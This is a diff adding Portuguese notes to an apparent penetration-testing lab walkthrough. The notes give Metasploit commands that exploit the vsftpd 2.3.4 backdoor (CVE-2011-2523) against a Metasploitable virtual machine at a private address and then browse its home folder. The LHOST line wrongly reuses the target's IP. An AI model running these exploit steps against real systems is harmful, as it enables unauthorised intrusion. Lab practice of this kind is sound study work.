@@ -64,3 +64,13 @@ MAC Address: 08:00:27:36:C6:B0 (Oracle VirtualBox virtual NIC)`
 
 ### Abrir console
 `msfconsole`
+#### Ao estar no console no msf digitar
+`search CVE-2011-2523`
+
+#### A
+`use exploit/unix/ftp/vsftpd_234_backdoor`
+`show options`
+`set RHOSTS 192.168.56.102` - IP que vamos atacar
+`set LHOST 192.168.56.102` - IP remoto (o nosso)
+`exploit` - tentar acesso ao nosso alvo
+`cd /home/msfadmin` - acessar pasta home do Metasploitable
